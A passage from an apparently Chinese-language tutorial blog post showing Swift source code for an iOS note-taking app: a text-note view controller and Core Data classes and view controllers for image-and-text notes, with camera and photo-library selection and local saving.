<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> UIKit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 文本记事的笔记详情页</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NoteViewController</span>: <span class="title">UIViewController</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> note: <span class="type">Note</span>!</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">@IBOutlet</span> <span class="keyword">var</span> textView: <span class="type">UITextView</span>!</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">@IBAction</span> <span class="function"><span class="keyword">func</span> <span class="title">deleteNote</span>()</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">_</span> <span class="operator">=</span> <span class="type">NoteManager</span>.main.delete(note: note)</span><br><span class="line">        navigationController<span class="operator">?</span>.popViewController(animated: <span class="literal">true</span>)</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 载入已有的笔记数据</span></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">func</span> <span class="title">viewDidLoad</span>()</span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.viewDidLoad()</span><br><span class="line">        textView.text <span class="operator">=</span> note.contents</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 保存返回时的笔记数据</span></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">func</span> <span class="title">viewWillDisappear</span>(<span class="keyword">_</span> <span class="params">animated</span>: <span class="type">Bool</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.viewWillDisappear(<span class="literal">true</span>)</span><br><span class="line">        note.contents <span class="operator">=</span> textView.text</span><br><span class="line">        <span class="type">NoteManager</span>.main.save(note: note)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="图文记事"><a href="#图文记事" class="headerlink" title="图文记事"></a>图文记事</h2><h3 id="数据类"><a href="#数据类" class="headerlink" title="数据类"></a>数据类</h3><h4 id="Note-CoreDataClass-swift"><a href="#Note-CoreDataClass-swift" class="headerlink" title="Note+CoreDataClass.swift"></a>Note+CoreDataClass.swift</h4><p>(文件可自动生成，不过是空文件，代码需要自己添加。生成操作见<strong>Swift使用CoreData储存数据</strong>)</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> UIKit</span><br><span class="line"><span class="keyword">import</span> CoreData</span><br><span class="line"></span><br><span class="line"><span class="keyword">@objc(Note)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ImageNote</span>: <span class="title">NSManagedObject</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> addDate: <span class="type">Date</span>? &#123;</span><br><span class="line">        <span class="keyword">get</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> rawAddDate <span class="keyword">as</span> <span class="type">Date</span>?</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">set</span> &#123;</span><br><span class="line">            rawAddDate <span class="operator">=</span> newValue <span class="keyword">as</span> <span class="type">NSDate</span>?</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> image: <span class="type">UIImage</span>? &#123;</span><br><span class="line">        <span class="keyword">get</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">let</span> imageData <span class="operator">=</span> rawImage <span class="keyword">as</span> <span class="type">Data</span>? &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="type">UIImage</span>(data: imageData)</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">set</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">let</span> image <span class="operator">=</span> newValue &#123;</span><br><span class="line">                rawImage <span class="operator">=</span> convertImageToNSData(image: image)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">convenience</span> <span class="function"><span class="keyword">init?</span>(<span class="params">title</span>: <span class="type">String</span>, <span class="params">body</span>: <span class="type">String</span>?, <span class="params">image</span>: <span class="type">UIImage</span>?)</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> appDelegate <span class="operator">=</span> <span class="type">UIApplication</span>.shared.delegate <span class="keyword">as?</span> <span class="type">AppDelegate</span></span><br><span class="line">        <span class="comment">// import UIKit is needed to access UIApplication</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">guard</span> <span class="keyword">let</span> managedContext <span class="operator">=</span> appDelegate<span class="operator">?</span>.persistentContainer.viewContext, <span class="operator">!</span>title.isEmpty <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">self</span>.<span class="keyword">init</span>(entity: <span class="type">ImageNote</span>.entity(), insertInto: managedContext)</span><br><span class="line">        <span class="keyword">self</span>.title <span class="operator">=</span> title</span><br><span class="line">        <span class="keyword">self</span>.body <span class="operator">=</span> body</span><br><span class="line">        <span class="keyword">self</span>.addDate <span class="operator">=</span> <span class="type">Date</span>(timeIntervalSinceNow: <span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> image <span class="operator">=</span> image &#123;</span><br><span class="line">            <span class="keyword">self</span>.rawImage <span class="operator">=</span> convertImageToNSData(image: image)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">convertImageToNSData</span>(<span class="params">image</span>: <span class="type">UIImage</span>)</span> -&gt; <span class="type">NSData</span>? &#123;</span><br><span class="line">        <span class="comment">// The image data can be represented as PNG or JPEG data formats.</span></span><br><span class="line">        <span class="comment">// Both ways to format the image data are listed below and the JPEG version is the one being used.</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//return image.jpegData(compressionQuality: 1.0) as NSData?</span></span><br><span class="line">        <span class="keyword">return</span> processImage(image: image).pngData() <span class="keyword">as</span> <span class="type">NSData</span>?</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// See: https://stackoverflow.com/questions/3554244/uiimagepngrepresentation-issues-images-rotated-by-90-degrees/33311936</span></span><br><span class="line">    <span class="comment">// This function processes the image so that it is oriented correctly when displayed.</span></span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">processImage</span>(<span class="params">image</span>: <span class="type">UIImage</span>)</span> -&gt; <span class="type">UIImage</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (image.imageOrientation <span class="operator">==</span> .up) &#123;</span><br><span class="line">            <span class="keyword">return</span> image</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">UIGraphicsBeginImageContext</span>(image.size)</span><br><span class="line">        </span><br><span class="line">        image.draw(in: <span class="type">CGRect</span>(origin: <span class="type">CGPoint</span>.zero, size: image.size), blendMode: .copy, alpha: <span class="number">1.0</span>)</span><br><span class="line">        <span class="keyword">let</span> copy <span class="operator">=</span> <span class="type">UIGraphicsGetImageFromCurrentImageContext</span>()</span><br><span class="line">        </span><br><span class="line">        <span class="type">UIGraphicsEndImageContext</span>()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">guard</span> <span class="keyword">let</span> unwrappedCopy <span class="operator">=</span> copy <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> image</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> unwrappedCopy</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Note-CoreDataProperties-swift"><a href="#Note-CoreDataProperties-swift" class="headerlink" title="Note+CoreDataProperties.swift"></a>Note+CoreDataProperties.swift</h4><p>(文件可自动生成，不过是空文件，代码需要自己添加。生成操作见<strong>Swift使用CoreData储存数据</strong>)</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Foundation</span><br><span class="line"><span class="keyword">import</span> CoreData</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">extension</span> <span class="title">ImageNote</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">@nonobjc</span> <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">func</span> <span class="title">fetchRequest</span>() -&gt; <span class="title">NSFetchRequest</span>&lt;<span class="title">ImageNote</span>&gt; </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="type">NSFetchRequest</span>&lt;<span class="type">ImageNote</span>&gt;(entityName: <span class="string">&quot;Note&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">@NSManaged</span> <span class="keyword">public</span> <span class="keyword">var</span> title: <span class="type">String</span>?</span><br><span class="line">    <span class="keyword">@NSManaged</span> <span class="keyword">public</span> <span class="keyword">var</span> body: <span class="type">String</span>?</span><br><span class="line">    <span class="keyword">@NSManaged</span> <span class="keyword">public</span> <span class="keyword">var</span> rawAddDate: <span class="type">NSDate</span>?</span><br><span class="line">    <span class="keyword">@NSManaged</span> <span class="keyword">public</span> <span class="keyword">var</span> rawImage: <span class="type">NSData</span>?</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="图文列表界面"><a href="#图文列表界面" class="headerlink" title="图文列表界面"></a>图文列表界面</h3><p>NotesViewController.swift</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> UIKit</span><br><span class="line"><span class="keyword">import</span> CoreData</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotesViewController</span>: <span class="title">UIViewController</span>, <span class="title">UITableViewDataSource</span>, <span class="title">UITableViewDelegate</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> notes <span class="operator">=</span> [<span class="type">ImageNote</span>]()</span><br><span class="line">    <span class="keyword">var</span> dateFormatter <span class="operator">=</span> <span class="type">DateFormatter</span>()</span><br><span class="line">    <span class="keyword">@IBOutlet</span> <span class="keyword">weak</span> <span class="keyword">var</span> notesTableView: <span class="type">UITableView</span>!</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">func</span> <span class="title">viewDidLoad</span>()</span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.viewDidLoad()</span><br><span class="line"></span><br><span class="line">        dateFormatter.dateStyle <span class="operator">=</span> .medium</span><br><span class="line">        dateFormatter.timeStyle <span class="operator">=</span> .medium</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">func</span> <span class="title">viewWillAppear</span>(<span class="keyword">_</span> <span class="params">animated</span>: <span class="type">Bool</span>)</span> &#123;</span><br><span class="line">        fetchNotes()</span><br><span class="line">        notesTableView.reloadData()</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">numberOfSections</span>(<span class="params">in</span> <span class="params">tableView</span>: <span class="type">UITableView</span>)</span> -&gt; <span class="type">Int</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">tableView</span>(<span class="keyword">_</span> <span class="params">tableView</span>: <span class="type">UITableView</span>, <span class="params">numberOfRowsInSection</span> <span class="params">section</span>: <span class="type">Int</span>)</span> -&gt; <span class="type">Int</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> notes.count</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">tableView</span>(<span class="keyword">_</span> <span class="params">tableView</span>: <span class="type">UITableView</span>, <span class="params">cellForRowAt</span> <span class="params">indexPath</span>: <span class="type">IndexPath</span>)</span> -&gt; <span class="type">UITableViewCell</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> cell <span class="operator">=</span> tableView.dequeueReusableCell(withIdentifier: <span class="string">&quot;noteCell&quot;</span>, for: indexPath)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">let</span> note <span class="operator">=</span> notes[indexPath.row]</span><br><span class="line">        cell.textLabel<span class="operator">?</span>.text <span class="operator">=</span> note.title</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> addDate <span class="operator">=</span> note.addDate &#123;</span><br><span class="line">            cell.detailTextLabel<span class="operator">?</span>.text <span class="operator">=</span> dateFormatter.string(from: addDate)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> cell</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 左划选择删除笔记</span></span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">tableView</span>(<span class="keyword">_</span> <span class="params">tableView</span>: <span class="type">UITableView</span>, <span class="params">editActionsForRowAt</span> <span class="params">indexPath</span>: <span class="type">IndexPath</span>)</span> -&gt; [<span class="type">UITableViewRowAction</span>]<span class="operator">?</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> deleteAction <span class="operator">=</span> <span class="type">UITableViewRowAction</span>(style: .destructive, title: <span class="string">&quot;Delete&quot;</span>) &#123; (rowAction, indexPath) <span class="keyword">in</span></span><br><span class="line">            <span class="keyword">self</span>.deleteNote(indexPath: indexPath)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> [deleteAction]</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">func</span> <span class="title">prepare</span>(<span class="params">for</span> <span class="params">segue</span>: <span class="type">UIStoryboardSegue</span>, <span class="params">sender</span>: <span class="keyword">Any</span><span class="operator">?</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> segue.identifier <span class="operator">==</span> <span class="string">&quot;Note&quot;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">let</span> destination <span class="operator">=</span> segue.destination <span class="keyword">as?</span> <span class="type">NoteDetailTableViewController</span> &#123;</span><br><span class="line">                destination.note <span class="operator">=</span> notes[notesTableView.indexPathForSelectedRow<span class="operator">!</span>.row]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 取出存在本地的图文笔记数据</span></span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">fetchNotes</span>()</span> &#123;</span><br><span class="line">        <span class="keyword">guard</span> <span class="keyword">let</span> appDelegate <span class="operator">=</span> <span class="type">UIApplication</span>.shared.delegate <span class="keyword">as?</span> <span class="type">AppDelegate</span> <span class="keyword">else</span> &#123;</span><br><span class="line">            notes <span class="operator">=</span> [<span class="type">ImageNote</span>]()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">let</span> managedContext <span class="operator">=</span> appDelegate.persistentContainer.viewContext</span><br><span class="line">        <span class="keyword">let</span> fetchRequest: <span class="type">NSFetchRequest</span>&lt;<span class="type">ImageNote</span>&gt; <span class="operator">=</span> <span class="type">ImageNote</span>.fetchRequest()</span><br><span class="line">        fetchRequest.sortDescriptors <span class="operator">=</span> [<span class="type">NSSortDescriptor</span>(key: <span class="string">&quot;rawAddDate&quot;</span>, ascending: <span class="literal">true</span>)]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            notes <span class="operator">=</span> <span class="keyword">try</span> managedContext.fetch(fetchRequest)</span><br><span class="line">        &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">            alertNotifyUser(message: <span class="string">&quot;Fetch for notes failed.&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">deleteNote</span>(<span class="params">indexPath</span>: <span class="type">IndexPath</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> note <span class="operator">=</span> notes[indexPath.row]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> managedObjectContext <span class="operator">=</span> note.managedObjectContext &#123;</span><br><span class="line">            managedObjectContext.delete(note)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> managedObjectContext.save()</span><br><span class="line">                <span class="keyword">self</span>.notes.remove(at: indexPath.row)</span><br><span class="line">                notesTableView.reloadData()</span><br><span class="line">            &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">                alertNotifyUser(message: <span class="string">&quot;Delete failed.&quot;</span>)</span><br><span class="line">                notesTableView.reloadData()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">alertNotifyUser</span>(<span class="params">message</span>: <span class="type">String</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> alert <span class="operator">=</span> <span class="type">UIAlertController</span>(title: <span class="string">&quot;Alert&quot;</span>, message: message, preferredStyle: .alert)</span><br><span class="line">        alert.addAction(<span class="type">UIAlertAction</span>(title: <span class="string">&quot;OK&quot;</span>, style: .default, handler: <span class="literal">nil</span>))</span><br><span class="line">        <span class="keyword">self</span>.present(alert, animated: <span class="literal">true</span>, completion: <span class="literal">nil</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="图文详情界面"><a href="#图文详情界面" class="headerlink" title="图文详情界面"></a>图文详情界面</h3><p>NoteDetailTableViewController.swift</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> UIKit</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NoteDetailTableViewController</span>: <span class="title">UITableViewController</span>, <span class="title">UIImagePickerControllerDelegate</span>, <span class="title">UINavigationControllerDelegate</span> </span>&#123;</span><br><span class="line">    <span class="keyword">@IBOutlet</span> <span class="keyword">weak</span> <span class="keyword">var</span> titleTextField: <span class="type">UITextField</span>!</span><br><span class="line">    <span class="keyword">@IBOutlet</span> <span class="keyword">weak</span> <span class="keyword">var</span> dateLabel: <span class="type">UILabel</span>!</span><br><span class="line">    <span class="keyword">@IBOutlet</span> <span class="keyword">weak</span> <span class="keyword">var</span> bodyTextView: <span class="type">UITextView</span>!</span><br><span class="line">    <span class="keyword">@IBOutlet</span> <span class="keyword">weak</span> <span class="keyword">var</span> imageView: <span class="type">UIImageView</span>!</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> dateFormatter <span class="operator">=</span> <span class="type">DateFormatter</span>()</span><br><span class="line">    <span class="keyword">let</span> newNoteDateFormatter <span class="operator">=</span> <span class="type">DateFormatter</span>()</span><br><span class="line">    <span class="keyword">let</span> imagePickerController <span class="operator">=</span> <span class="type">UIImagePickerController</span>()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> note: <span class="type">ImageNote</span>!</span><br><span class="line">    <span class="keyword">var</span> image: <span class="type">UIImage</span>!</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">func</span> <span class="title">viewDidLoad</span>()</span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.viewDidLoad()</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Stylize the body Text View.</span></span><br><span class="line">        bodyTextView.layer.borderWidth <span class="operator">=</span> <span class="number">1.0</span></span><br><span class="line">        bodyTextView.layer.borderColor <span class="operator">=</span> <span class="type">UIColor</span>(red: <span class="number">0.8</span>, green: <span class="number">0.8</span>, blue: <span class="number">0.8</span>, alpha: <span class="number">1.0</span>).cgColor</span><br><span class="line">        bodyTextView.layer.cornerRadius <span class="operator">=</span> <span class="number">6.0</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Date Formatter for existing notes.</span></span><br><span class="line">        dateFormatter.dateStyle <span class="operator">=</span> .medium</span><br><span class="line">        dateFormatter.timeStyle <span class="operator">=</span> .medium</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Separate Date Formatter for new notes that only shows date (and no time).</span></span><br><span class="line">        <span class="comment">// The date and time are set when the note is saved in Core Data.</span></span><br><span class="line">        newNoteDateFormatter.dateStyle <span class="operator">=</span> .medium</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Initialize the form data.</span></span><br><span class="line">        <span class="comment">// If existing note, display its information.</span></span><br><span class="line">        <span class="comment">// If new note, show empty fields and a current Date (no time)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> note <span class="operator">=</span> note &#123;</span><br><span class="line">            titleTextField.text <span class="operator">=</span> note.title</span><br><span class="line">            bodyTextView.text <span class="operator">=</span> note.body</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">let</span> addDate <span class="operator">=</span> note.addDate &#123;</span><br><span class="line">                dateLabel.text <span class="operator">=</span> dateFormatter.string(from: addDate)</span><br><span class="line">            &#125;</span><br><span class="line">            image <span class="operator">=</span> note.image</span><br><span class="line">            imageView.image <span class="operator">=</span> image</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            titleTextField.text <span class="operator">=</span> <span class="string">&quot;&quot;</span></span><br><span class="line">            bodyTextView.text <span class="operator">=</span> <span class="string">&quot;&quot;</span></span><br><span class="line">            dateLabel.text <span class="operator">=</span> newNoteDateFormatter.string(from: <span class="type">Date</span>(timeIntervalSinceNow: <span class="number">0</span>))</span><br><span class="line">            imageView.image <span class="operator">=</span> <span class="literal">nil</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取图片</span></span><br><span class="line">    <span class="keyword">@IBAction</span> <span class="function"><span class="keyword">func</span> <span class="title">selectImage</span>(<span class="keyword">_</span> <span class="params">sender</span>: <span class="keyword">Any</span>)</span> &#123;</span><br><span class="line">        selectImageSource()</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 选择拍摄或者选择本地图片</span></span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">selectImageSource</span>()</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> alert <span class="operator">=</span> <span class="type">UIAlertController</span>(title: <span class="string">&quot;Select Image Source&quot;</span>, message: <span class="literal">nil</span>, preferredStyle: .actionSheet)</span><br><span class="line">        alert.addAction(<span class="type">UIAlertAction</span>(title: <span class="string">&quot;Camera&quot;</span>, style: .default, handler: &#123;</span><br><span class="line">            (alertAction) <span class="keyword">in</span></span><br><span class="line">            <span class="keyword">self</span>.takePhotoUsingCamera()</span><br><span class="line">        &#125;))</span><br><span class="line">        alert.addAction(<span class="type">UIAlertAction</span>(title: <span class="string">&quot;Photo Library&quot;</span>, style: .default, handler: &#123;</span><br><span class="line">            (alertAction) <span class="keyword">in</span></span><br><span class="line">            <span class="keyword">self</span>.selectPhotoFromLibrary()</span><br><span class="line">        &#125;))</span><br><span class="line">        alert.addAction(<span class="type">UIAlertAction</span>(title: <span class="string">&quot;Cancel&quot;</span>, style: .cancel, handler: <span class="literal">nil</span>))</span><br><span class="line">        <span class="keyword">self</span>.present(alert, animated: <span class="literal">true</span>, completion: <span class="literal">nil</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 调用相机</span></span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">takePhotoUsingCamera</span>()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="operator">!</span><span class="type">UIImagePickerController</span>.isSourceTypeAvailable(.camera)) &#123;</span><br><span class="line">            alertNotifyUser(message: <span class="string">&quot;This device has no camera.&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        imagePickerController.sourceType <span class="operator">=</span> .camera</span><br><span class="line">        imagePickerController.delegate <span class="operator">=</span> <span class="keyword">self</span></span><br><span class="line">        present(imagePickerController, animated: <span class="literal">true</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 从本地选择</span></span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">selectPhotoFromLibrary</span>()</span> &#123;</span><br><span class="line">        imagePickerController.sourceType <span class="operator">=</span> .photoLibrary</span><br><span class="line">        imagePickerController.delegate <span class="operator">=</span> <span class="keyword">self</span></span><br><span class="line">        present(imagePickerController, animated: <span class="literal">true</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">imagePickerController</span>(<span class="keyword">_</span> <span class="params">picker</span>: <span class="type">UIImagePickerController</span>, <span class="params">didFinishPickingMediaWithInfo</span> <span class="params">info</span>: [<span class="type">UIImagePickerController</span>.<span class="params">InfoKey</span> : <span class="keyword">Any</span>])</span> &#123;</span><br><span class="line">        <span class="keyword">defer</span> &#123;</span><br><span class="line">            imagePickerController.dismiss(animated: <span class="literal">true</span>, completion: <span class="literal">nil</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">guard</span> <span class="keyword">let</span> selectedImage <span class="operator">=</span> info[<span class="type">UIImagePickerController</span>.<span class="type">InfoKey</span>.originalImage] <span class="keyword">as?</span> <span class="type">UIImage</span> <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        image <span class="operator">=</span> selectedImage</span><br><span class="line">        imageView.image <span class="operator">=</span> image</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> note <span class="operator">=</span> note &#123;</span><br><span class="line">            note.image <span class="operator">=</span> selectedImage</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">alertNotifyUser</span>(<span class="params">message</span>: <span class="type">String</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> alert <span class="operator">=</span> <span class="type">UIAlertController</span>(title: <span class="string">&quot;Alert&quot;</span>, message: message, preferredStyle: .alert)</span><br><span class="line">        alert.addAction(<span class="type">UIAlertAction</span>(title: <span class="string">&quot;OK&quot;</span>, style: .default, handler: <span class="literal">nil</span>))</span><br><span class="line">        <span class="keyword">self</span>.present(alert, animated: <span class="literal">true</span>, completion: <span class="literal">nil</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 保存图文笔记信息到本地</span></span><br><span class="line">    <span class="keyword">@IBAction</span> <span class="function"><span class="keyword">func</span> <span class="title">save</span>(<span class="keyword">_</span> <span class="params">sender</span>: <span class="keyword">Any</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">guard</span> <span class="keyword">let</span> title <span class="operator">=</span> titleTextField.text<span class="operator">?</span>.trimmingCharacters(in: .whitespaces), <span class="operator">!</span>title.isEmpty <span class="keyword">else</span> &#123;</span><br><span class="line">            alertNotifyUser(message: <span class="string">&quot;Please enter a title before saving the note.&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// if an existing note, update it</span></span><br><span class="line">        <span class="comment">// otherwise, create a new note</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> note <span class="operator">=</span> note &#123;</span><br><span class="line">            note.title <span class="operator">=</span> title</span><br><span class="line">            note.body <span class="operator">=</span> bodyTextView.text</span><br><span class="line">            note.image <span class="operator">=</span> image</span><br><span class="line">            <span class="comment">// addDate is set when the Note is initialized</span></span><br><span class="line">            <span class="comment">// for existing note, the addDate stays the same as initially set</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            note <span class="operator">=</span> <span class="type">ImageNote</span>(title: title, body: bodyTextView.text, image: image)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// If a note exists, save it.</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> note <span class="operator">=</span> note &#123;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="keyword">let</span> managedContext <span class="operator">=</span> note.managedObjectContext</span><br><span class="line">                <span class="keyword">try</span> managedContext<span class="operator">?</span>.save()</span><br><span class="line">            &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">                alertNotifyUser(message: <span class="string">&quot;The note could not be saved.&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            alertNotifyUser(message: <span class="string">&quot;The note could not be created.&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Return to list of Notes.</span></span><br><span class="line">        navigationController<span class="operator">?</span>.popViewController(animated: <span class="literal">true</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
